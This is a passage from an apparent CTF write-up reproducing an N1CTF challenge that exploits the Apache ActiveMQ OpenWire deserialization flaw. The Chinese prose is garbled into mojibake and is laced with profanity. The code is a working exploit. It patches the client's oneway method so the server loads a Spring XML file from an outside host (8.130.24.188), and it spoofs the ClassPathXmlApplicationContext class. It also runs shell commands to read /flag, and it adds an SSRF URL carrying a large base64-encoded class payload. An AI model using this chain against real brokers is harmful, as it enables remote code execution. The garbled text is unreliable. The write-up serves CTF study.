ä½¿ç”¨é€‚å½“çš„ç‰ˆæœ¬ --&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>mavené‡æ–°åŠ è½½çš„æ—¶å€™åˆtmdæŠŠè‡ªå·±åŠ çš„ä¾èµ–å»æ‰äº†,é‡æ–°åŠ ä¸€ä¸‹.</p><p>è¿è¡Œå,èµ°åˆ°æ–­ç‚¹å¤„</p><p>æ ¹æ®dataTypeæŒ‡å®šçš„DataStreamMarshallerå®ç°ç±»ï¼Œè°ƒç”¨createObjectæ–¹æ³•ã€‚ç„¶åæ ¹æ®<code>tightEncodingEnabled</code>é€‰æ‹©tightUnmarshalæˆ–looseUnmarshal</p><p>ä¸€æ¬¡ApacheMQçš„é€šè®¯è¯·æ±‚ä¸­ä¼šä¸æ–­çš„æœ‰marshalå’Œdounmarshalçš„æ“ä½œ</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699356385920.png" alt="1699356385920"></p><p>è€Œ<code>ExceptionResponseMarshaller</code>æœ‰<code>tightUnmarhsal</code>æ–¹æ³•,ä¼šè¿›å…¥å…¶<code>tightUnmarhsal</code>æ–¹æ³•,æ˜¯<code>BaseDataStreamMarshaller</code>çš„å­ç±»</p><p>ä»€ä¹ˆ?ä½ é—®ä»€ä¹ˆæ˜¯<code>BaseDataStreamMarshaller</code>?ä¸å°±æ˜¯æœ€ç»ˆæ¼æ´åˆ©ç”¨ç‚¹çš„åœ°æ–¹å—.</p><p><code>ExceptionResponseMarshaller#looseUnmarshal</code>ä¼šè°ƒç”¨looseUnmarsalThrowableï¼Œä»è€Œè°ƒç”¨<code>org.apache.activemq.openwire.v12.BaseDataStreamMarshaller#createThrowable</code>åˆ°è¾¾æ¼æ´åˆ©ç”¨ç‚¹.</p><p>æéº»éº»åœ°,å¥½âˆšâ…§éš¾è°ƒ,nmdä¸€æ¬¡è¿˜æœ‰æ—¶é—´é™åˆ¶</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699357487163.png" alt="1699357487163"></p><p>èµ°åˆ°<code>looseUnmarsalThrowable</code></p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699358236329.png" alt="1699358236329"></p><p>è¿™é‡Œå°±è¿›å…¥äº†æ¶æ„æ–¹æ³•,è‡³æ­¤,æˆ‘ä»¬éœ€è¦æ§åˆ¶<code>clazz</code>å’Œ<code>message</code></p><p>å› ä¸º ExceptionResponseMarshaller ä¹Ÿæœ‰ <code>marshal</code> æ–¹æ³•, æ‰€ä»¥å°±ç ”ç©¶å¦‚ä½•å»å‘é€ä¸€ä¸ªç»ç”±è¿™ä¸ª marshaller å¤„ç†çš„ <code>ExceptionResponse</code></p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699361719795.png" alt="1699361719795"></p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699362221605.png" alt="1699362221605"></p><p><code>oneway</code> æ–¹æ³•ä¼šè°ƒç”¨ <code>wireFormat.marshal()</code> å»åºåˆ—åŒ– command</p><p>command å°±æ˜¯å‰é¢å‡†å¤‡å‘é€çš„ <code>ObjectMessage</code>, è€Œ wireFormat å°±æ˜¯å’Œå®ƒå¯¹åº”çš„åºåˆ—åŒ–å™¨</p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ‰‹åŠ¨ patch è¿™ä¸ªæ–¹æ³•, å°† command æ”¹æˆ ExceptionResponse, å°† wireFormat æ”¹æˆ ExceptionResponseMarshaller å³å¯</p><p><code>this.wireFormat.marshal(command, this.dataOut);</code>æˆ‘ä»¬åœ¨è¿™é‡Œæ‰‹åŠ¨patchå…¶ä¸­commandä¸ºCPXç±»ï¼Œæˆ‘ä»¬çš„åšæ³•å¾ˆç®€å•ï¼Œä¹Ÿåªéœ€è¦å†™ä¸€ä¸ªç›¸åŒçš„åŒ…åï¼Œè¿™æ ·ç”±äºæ–¹æ³•è°ƒç”¨æœºåˆ¶ï¼Œä¼šä¼˜å…ˆå¯»æ‰¾æˆ‘ä»¬é‡å†™çš„ç±»ï¼Œç„¶åè°ƒç”¨å…¶ä¸­çš„onwayæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oneway</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>.checkStarted();</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://8.130.24.188:8000/rce.xml&quot;</span>);</span><br><span class="line">    <span class="type">ExceptionResponse</span> <span class="variable">exceptionResponse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>(context);</span><br><span class="line">    <span class="built_in">this</span>.wireFormat.marshal(exceptionResponse, <span class="built_in">this</span>.dataOut);</span><br><span class="line">    <span class="built_in">this</span>.dataOut.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.context.support;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassPathXmlApplicationContext</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„é‡å†™getMedssageï¼Œè¿™æ˜¯ä¸ºäº†è®©æœåŠ¡ç«¯è·å–åˆ°messageï¼Œä¹Ÿå°±æ˜¯å®ä¾‹åŒ–å‚æ•°ï¼‰ç»§æ‰¿Throwableæ˜¯å› ä¸ºExceptionResponseéœ€è¦Exceptionç±»å‹ï¼Œæˆ‘ä»¬åªæ˜¯éœ€è¦ä»–çš„ç±»åå’Œä¼ å‚ã€‚ç„¶åæœåŠ¡ç«¯ä¼šæ ¹æ®è¿™2ä¸ªå€¼è¿›è¡Œå®ä¾‹åŒ–.</p><p>çœŸâˆšâ…§æ¶å¿ƒ,å¤ªéš¾è°ƒäº†,è€æ˜¯æ‰è¿æ¥.</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699367131598.png" alt="1699367131598"></p><p>ä¼šè¿›è¡Œæœ¬åœ°åºåˆ—åŒ–,ç›´æ¥æ”¹æ–¹æ³•</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699403992353.png" alt="1699403992353"></p><p>ç®—äº†,æ ¹æ®æ–‡æ¡£,æ‰“ä¸€ä¸ªsockåè®®<a href="https://activemq.apache.org/openwire-version-2-specification">ActiveMQ (apache.org)</a>ğŸ˜…</p><h2 id="æ‰“tmdé¢˜ç›®"><span id="æ‰“tmdé¢˜ç›®"> æ‰“tmdé¢˜ç›®ğŸ˜¡</span></h2><p>nmdé¢˜ç›®åä»£ä¸è®©å‡ºç½‘,å®Œå…¨åˆ©ç”¨ä¸äº†.ğŸ˜…</p><p>è‚–å¥ä»!!!ğŸ˜¡,é¢˜ç›®æ—¢ç„¶è¿˜æœ‰ä¸€ä¸ªæŒ‚GSONçš„æœºå­,ğŸ‘´å°±æ‰“tmdçš„SSRFğŸ˜¤</p><p>å‚è€ƒNESEçˆ¹çš„exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.jms.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> <span class="keyword">implements</span> <span class="title class_">MessageListener</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">publish</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        javax.jms.ConnectionFactory factory;</span><br><span class="line">        factory = <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://127.0.0.1:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> factory.createConnection();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">pubSession</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Queue</span> <span class="variable">queue</span> <span class="operator">=</span> pubSession.createQueue(<span class="string">&quot;flagqueue&quot;</span>);</span><br><span class="line">        <span class="type">MessageProducer</span> <span class="variable">publisher</span> <span class="operator">=</span> pubSession.createProducer(queue);</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /flag&quot;</span>&#125;;</span><br><span class="line">        <span class="type">byte</span>[] bs = <span class="keyword">new</span> <span class="title class_">Scanner</span>(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream())</span><br><span class="line">                .useDelimiter(<span class="string">&quot;\\A&quot;</span>)</span><br><span class="line">                .next()</span><br><span class="line">                .getBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bs);</span><br><span class="line">        <span class="type">TextMessage</span> <span class="variable">msg</span> <span class="operator">=</span> pubSession.createTextMessage();</span><br><span class="line">        msg.setText(message);</span><br><span class="line">        publisher.send(msg);</span><br><span class="line">        System.out.println(<span class="string">&quot;publish finished&quot;</span>);</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">consume</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://xxx:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> factory.createConnection();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">subSession</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Queue</span> <span class="variable">queue</span> <span class="operator">=</span> subSession.createQueue(<span class="string">&quot;flagqueue&quot;</span>);</span><br><span class="line">        <span class="type">MessageConsumer</span> <span class="variable">subscriber</span> <span class="operator">=</span> subSession.createConsumer(queue);</span><br><span class="line">        subscriber.setMessageListener(<span class="built_in">this</span>);</span><br><span class="line">        connection.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">main</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">         main.publish();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(Message message)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Received &quot;</span> + ((TextMessage) message).getText());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸ªæ–‡ä»¶è¯»flag,ä»æ–‡ä»¶ <code>/flag</code> è¯»å–å†…å®¹ï¼Œå¹¶å°†å…¶ä½œä¸ºæ–‡æœ¬æ¶ˆæ¯å‘é€åˆ°åä¸º â€œflagqueueâ€ çš„ ActiveMQ æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚è¿™ä½¿å¾—å…¶ä»–åº”ç”¨ç¨‹åºå¯ä»¥è®¢é˜… â€œflagqueueâ€ é˜Ÿåˆ—æ¥æ¥æ”¶æ¶ˆæ¯ã€‚</p><p>æ”¹ä¸€ä¸‹oneway,é€šè¿‡è¿™ä¸ªå»SSRFçš„GSON</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oneway</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>.checkStarted();</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://127.0.0.1:8877/api/sun.print.PrintServiceLookupProvider/eyJscGNBbGxDb20iOlsieXY2NnZnQUFBRFFBd1FvQU1RQmRCd0JlQ0FCZkNnQUNBR0FMQUdFQVlnY0FZd3NBWkFCbENBQm1Dd0FHQUdjTEFBWUFhQWNBYVFnQWFnZ0Fhd2dBYkFjQWJRY0FiZ29BRUFCdkNnQVFBSEFLQUhFQWNnb0FEd0J6Q0FCMENnQVBBSFVLQUE4QWRnb0FDd0IzQ2dBTEFIZ0xBQVlBZVFzQUxBQjZDd0I3QUh3SkFIMEFmZ2dBZndvQWdBQ0JDd0JrQUlJSUFJTUxBQVlBaEFzQWhRQ0dDd0JrQUljSEFJZ0tBQ1VBWFFvQUpRQ0pCd0NLQ2dBb0FGMElBSXNLQUNnQWpBY0FqUXNBTEFDT0NnQW9BSThIQUpBS0FDOEFrUWNBa2djQWt3RUFCanhwYm1sMFBnRUFBeWdwVmdFQUJFTnZaR1VCQUE5TWFXNWxUblZ0WW1WeVZHRmliR1VCQUJKTWIyTmhiRlpoY21saFlteGxWR0ZpYkdVQkFBUjBhR2x6QVFBR1RFMWhhVzQ3QVFBSGNIVmliR2x6YUFFQUIyWmhZM1J2Y25rQkFCMU1hbUYyWVhndmFtMXpMME52Ym01bFkzUnBiMjVHWVdOMGIzSjVPd0VBQ21OdmJtNWxZM1JwYjI0QkFCWk1hbUYyWVhndmFtMXpMME52Ym01bFkzUnBiMjQ3QVFBS2NIVmlVMlZ6YzJsdmJnRUFFMHhxWVhaaGVDOXFiWE12VTJWemMybHZianNCQUFWeGRXVjFaUUVBRVV4cVlYWmhlQzlxYlhNdlVYVmxkV1U3QVFBSmNIVmliR2x6YUdWeUFRQWJUR3BoZG1GNEwycHRjeTlOWlhOellXZGxVSEp2WkhWalpYSTdBUUFEWTIxa0FRQVRXMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBQW1KekFRQUNXMElCQUFkdFpYTnpZV2RsQVFBU1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQURiWE5uQVFBWFRHcGhkbUY0TDJwdGN5OVVaWGgwVFdWemMyRm5aVHNCQUFwRmVHTmxjSFJwYjI1ekFRQUhZMjl1YzNWdFpRRUFDbk4xWWxObGMzTnBiMjRCQUFwemRXSnpZM0pwWW1WeUFRQWJUR3BoZG1GNEwycHRjeTlOWlhOellXZGxRMjl1YzNWdFpYSTdBUUFFYldGcGJnRUFGaWhiVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZZQkFBUmhjbWR6QVFBSmIyNU5aWE56WVdkbEFRQVdLRXhxWVhaaGVDOXFiWE12VFdWemMyRm5aVHNwVmdFQUFXVUJBQlZNYW1GMllTOXNZVzVuTDBWNFkyVndkR2x2YmpzQkFCTk1hbUYyWVhndmFtMXpMMDFsYzNOaFoyVTdBUUFOVTNSaFkydE5ZWEJVWVdKc1pRRUFDbE52ZFhKalpVWnBiR1VCQUFsTllXbHVMbXBoZG1FTUFETUFOQUVBTFc5eVp5OWhjR0ZqYUdVdllXTjBhWFpsYlhFdlFXTjBhWFpsVFZGRGIyNXVaV04wYVc5dVJtRmpkRzl5ZVFFQUZYUmpjRG92THpFeU55NHdMakF1TVRvMk1UWXhOZ3dBTXdDVUJ3Q1ZEQUNXQUpjQkFCRnFZWFpoZUM5cWJYTXZVMlZ6YzJsdmJnY0FtQXdBbVFDYUFRQUpabXhoWjNGMVpYVmxEQUNiQUp3TUFKMEFuZ0VBRUdwaGRtRXZiR0Z1Wnk5VGRISnBibWNCQUFjdlltbHVMM05vQVFBQ0xXTUJBQWxqWVhRZ0wyWnNZV2NCQUJGcVlYWmhMM1YwYVd3dlUyTmhibTVsY2dFQUdHcGhkbUV2YkdGdVp5OVFjbTlqWlhOelFuVnBiR1JsY2d3QU13QlREQUNmQUtBSEFLRU1BS0lBb3d3QU13Q2tBUUFDWEVFTUFLVUFwZ3dBcHdDb0RBQ3BBS29NQURNQXF3d0FyQUN0REFDdUFKUUhBSzhNQUxBQVZnY0FzUXdBc2dDekFRQVFjSFZpYkdsemFDQm1hVzVwYzJobFpBY0F0QXdBdFFDVURBQzJBRFFCQUE5MFkzQTZMeTk0ZUhnNk5qRTJNVFlNQUxjQXVBY0F1UXdBdWdDN0RBQ2ZBRFFCQUFSTllXbHVEQUE2QURRQkFCZHFZWFpoTDJ4aGJtY3ZVM1J5YVc1blFuVnBiR1JsY2dFQUNWSmxZMlZwZG1Wa0lBd0F2QUM5QVFBVmFtRjJZWGd2YW0xekwxUmxlSFJOWlhOellXZGxEQUMrQUtnTUFMOEFxQUVBRTJwaGRtRXZiR0Z1Wnk5RmVHTmxjSFJwYjI0TUFNQUFOQUVBRUdwaGRtRXZiR0Z1Wnk5UFltcGxZM1FCQUJscVlYWmhlQzlxYlhNdlRXVnpjMkZuWlV4cGMzUmxibVZ5QVFBVktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bFdBUUFiYW1GMllYZ3ZhbTF6TDBOdmJtNWxZM1JwYjI1R1lXTjBiM0o1QVFBUVkzSmxZWFJsUTI5dWJtVmpkR2x2YmdFQUdDZ3BUR3BoZG1GNEwycHRjeTlEYjI1dVpXTjBhVzl1T3dFQUZHcGhkbUY0TDJwdGN5OURiMjV1WldOMGFXOXVBUUFOWTNKbFlYUmxVMlZ6YzJsdmJnRUFGeWhhU1NsTWFtRjJZWGd2YW0xekwxTmxjM05wYjI0N0FRQUxZM0psWVhSbFVYVmxkV1VCQUNVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoZUM5cWJYTXZVWFZsZFdVN0FRQU9ZM0psWVhSbFVISnZaSFZqWlhJQkFEUW9UR3BoZG1GNEwycHRjeTlFWlhOMGFXNWhkR2x2YmpzcFRHcGhkbUY0TDJwdGN5OU5aWE56WVdkbFVISnZaSFZqWlhJN0FRQUZjM1JoY25RQkFCVW9LVXhxWVhaaEwyeGhibWN2VUhKdlkyVnpjenNCQUJGcVlYWmhMMnhoYm1jdlVISnZZMlZ6Y3dFQURtZGxkRWx1Y0hWMFUzUnlaV0Z0QVFBWEtDbE1hbUYyWVM5cGJ5OUpibkIxZEZOMGNtVmhiVHNCQUJnb1RHcGhkbUV2YVc4dlNXNXdkWFJUZEhKbFlXMDdLVllCQUF4MWMyVkVaV3hwYldsMFpYSUJBQ2NvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMM1YwYVd3dlUyTmhibTVsY2pzQkFBUnVaWGgwQVFBVUtDbE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQWhuWlhSQ2VYUmxjd0VBQkNncFcwSUJBQVVvVzBJcFZnRUFFV055WldGMFpWUmxlSFJOWlhOellXZGxBUUFaS0NsTWFtRjJZWGd2YW0xekwxUmxlSFJOWlhOellXZGxPd0VBQjNObGRGUmxlSFFCQUJscVlYWmhlQzlxYlhNdlRXVnpjMkZuWlZCeWIyUjFZMlZ5QVFBRWMyVnVaQUVBRUdwaGRtRXZiR0Z1Wnk5VGVYTjBaVzBCQUFOdmRYUUJBQlZNYW1GMllTOXBieTlRY21sdWRGTjBjbVZoYlRzQkFCTnFZWFpoTDJsdkwxQnlhVzUwVTNSeVpXRnRBUUFIY0hKcGJuUnNiZ0VBQldOc2IzTmxBUUFPWTNKbFlYUmxRMjl1YzNWdFpYSUJBRFFvVEdwaGRtRjRMMnB0Y3k5RVpYTjBhVzVoZEdsdmJqc3BUR3BoZG1GNEwycHRjeTlOWlhOellXZGxRMjl1YzNWdFpYSTdBUUFaYW1GMllYZ3ZhbTF6TDAxbGMzTmhaMlZEYjI1emRXMWxjZ0VBRW5ObGRFMWxjM05oWjJWTWFYTjBaVzVsY2dFQUhpaE1hbUYyWVhndmFtMXpMMDFsYzNOaFoyVk1hWE4wWlc1bGNqc3BWZ0VBQm1Gd2NHVnVaQUVBTFNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1kQ2RXbHNaR1Z5T3dFQUIyZGxkRlJsZUhRQkFBaDBiMU4wY21sdVp3RUFEM0J5YVc1MFUzUmhZMnRVY21GalpRQWhBQ1VBTVFBQkFESUFBQUFGQUFFQU13QTBBQUVBTlFBQUFDOEFBUUFCQUFBQUJTcTNBQUd4QUFBQUFnQTJBQUFBQmdBQkFBQUFCUUEzQUFBQURBQUJBQUFBQlFBNEFEa0FBQUFDQURvQU5BQUNBRFVBQUFGZUFBVUFDZ0FBQUpxN0FBSlpFZ08zQUFSTUs3a0FCUUVBVFN3REJMa0FCd01BVGkwU0NMa0FDUUlBT2dRdEdRUzVBQW9DQURvRkJyMEFDMWtERWd4VFdRUVNEVk5aQlJJT1V6b0d1d0FQV2JzQUVGa1pCcmNBRWJZQUVyWUFFN2NBRkJJVnRnQVd0Z0FYdGdBWU9nZTdBQXRaR1FlM0FCazZDQzI1QUJvQkFEb0pHUWtaQ0xrQUd3SUFHUVVaQ2JrQUhBSUFzZ0FkRWg2MkFCOHN1UUFnQVFDeEFBQUFBZ0EyQUFBQVJnQVJBQUFBQ0FBS0FBa0FFUUFLQUJvQUN3QWtBQXdBTGdBTkFFTUFEZ0JiQUE4QVhnQVFBR0VBRVFCbUFCSUFjUUFUQUhrQUZBQ0NBQlVBaXdBV0FKTUFGd0NaQUJnQU53QUFBR1lBQ2dBQUFKb0FPQUE1QUFBQUNnQ1FBRHNBUEFBQkFCRUFpUUE5QUQ0QUFnQWFBSUFBUHdCQUFBTUFKQUIyQUVFQVFnQUVBQzRBYkFCREFFUUFCUUJEQUZjQVJRQkdBQVlBWmdBMEFFY0FTQUFIQUhFQUtRQkpBRW9BQ0FCNUFDRUFTd0JNQUFrQVRRQUFBQVFBQVFBdkFBSUFUZ0EwQUFJQU5RQUFBTFVBQXdBR0FBQUFQYnNBQWxrU0liY0FCRXdydVFBRkFRQk5MQU1FdVFBSEF3Qk9MUklJdVFBSkFnQTZCQzBaQkxrQUlnSUFPZ1VaQlNxNUFDTUNBQ3k1QUNRQkFMRUFBQUFDQURZQUFBQWlBQWdBQUFBYkFBb0FIQUFSQUIwQUdnQWVBQ1FBSHdBdUFDQUFOZ0FoQUR3QUlnQTNBQUFBUGdBR0FBQUFQUUE0QURrQUFBQUtBRE1BT3dBOEFBRUFFUUFzQUQwQVBnQUNBQm9BSXdCUEFFQUFBd0FrQUJrQVFRQkNBQVFBTGdBUEFGQUFVUUFGQUUwQUFBQUVBQUVBTHdBSkFGSUFVd0FDQURVQUFBQkpBQUlBQWdBQUFBMjdBQ1ZadHdBbVRDdTNBQ2V4QUFBQUFnQTJBQUFBRGdBREFBQUFKZ0FJQUNjQURBQW9BRGNBQUFBV0FBSUFBQUFOQUZRQVJnQUFBQWdBQlFCU0FEa0FBUUJOQUFBQUJBQUJBQzhBQVFCVkFGWUFBUUExQUFBQWpRQURBQU1BQUFBcXNnQWR1d0FvV2JjQUtSSXF0Z0FySzhBQUxMa0FMUUVBdGdBcnRnQXV0Z0FmcHdBSVRTeTJBREN4QUFFQUFBQWhBQ1FBTHdBREFEWUFBQUFXQUFVQUFBQXRBQ0VBTUFBa0FDNEFKUUF2QUNrQU1RQTNBQUFBSUFBREFDVUFCQUJYQUZnQUFnQUFBQ29BT0FBNUFBQUFBQUFxQUVrQVdRQUJBRm9BQUFBSEFBSmtCd0F2QkFBQkFGc0FBQUFDQUZ3PSIsInl2NjZ2Z0FBQURRQXdRb0FNUUJkQndCZUNBQmZDZ0FDQUdBTEFHRUFZZ2NBWXdzQVpBQmxDQUJtQ3dBR0FHY0xBQVlBYUFjQWFRZ0FhZ2dBYXdnQWJBY0FiUWNBYmdvQUVBQnZDZ0FRQUhBS0FIRUFjZ29BRHdCekNBQjBDZ0FQQUhVS0FBOEFkZ29BQ3dCM0NnQUxBSGdMQUFZQWVRc0FMQUI2Q3dCN0FId0pBSDBBZmdnQWZ3b0FnQUNCQ3dCa0FJSUlBSU1MQUFZQWhBc0FoUUNHQ3dCa0FJY0hBSWdLQUNVQVhRb0FKUUNKQndDS0NnQW9BRjBJQUlzS0FDZ0FqQWNBalFzQUxBQ09DZ0FvQUk4SEFKQUtBQzhBa1FjQWtnY0Frd0VBQmp4cGJtbDBQZ0VBQXlncFZnRUFCRU52WkdVQkFBOU1hVzVsVG5WdFltVnlWR0ZpYkdVQkFCSk1iMk5oYkZaaGNtbGhZbXhsVkdGaWJHVUJBQVIwYUdsekFRQUdURTFoYVc0N0FRQUhjSFZpYkdsemFBRUFCMlpoWTNSdmNua0JBQjFNYW1GMllYZ3ZhbTF6TDBOdmJtNWxZM1JwYjI1R1lXTjBiM0o1T3dFQUNtTnZibTVsWTNScGIyNEJBQlpNYW1GMllYZ3ZhbTF6TDBOdmJtNWxZM1JwYjI0N0FRQUtjSFZpVTJWemMybHZiZ0VBRTB4cVlYWmhlQzlxYlhNdlUyVnpjMmx2YmpzQkFBVnhkV1YxWlFFQUVVeHFZWFpoZUM5cWJYTXZVWFZsZFdVN0FRQUpjSFZpYkdsemFHVnlBUUFiVEdwaGRtRjRMMnB0Y3k5TlpYTnpZV2RsVUhKdlpIVmpaWEk3QVFBRFkyMWtBUUFUVzB4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3dFQUFtSnpBUUFDVzBJQkFBZHRaWE56WVdkbEFRQVNUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFEYlhObkFRQVhUR3BoZG1GNEwycHRjeTlVWlhoMFRXVnpjMkZuWlRzQkFBcEZlR05sY0hScGIyNXpBUUFIWTI5dWMzVnRaUUVBQ25OMVlsTmxjM05wYjI0QkFBcHpkV0p6WTNKcFltVnlBUUFiVEdwaGRtRjRMMnB0Y3k5TlpYTnpZV2RsUTI5dWMzVnRaWEk3QVFBRWJXRnBiZ0VBRmloYlRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tWWUJBQVJoY21kekFRQUpiMjVOWlhOellXZGxBUUFXS0V4cVlYWmhlQzlxYlhNdlRXVnpjMkZuWlRzcFZnRUFBV1VCQUJWTWFtRjJZUzlzWVc1bkwwVjRZMlZ3ZEdsdmJqc0JBQk5NYW1GMllYZ3ZhbTF6TDAxbGMzTmhaMlU3QVFBTlUzUm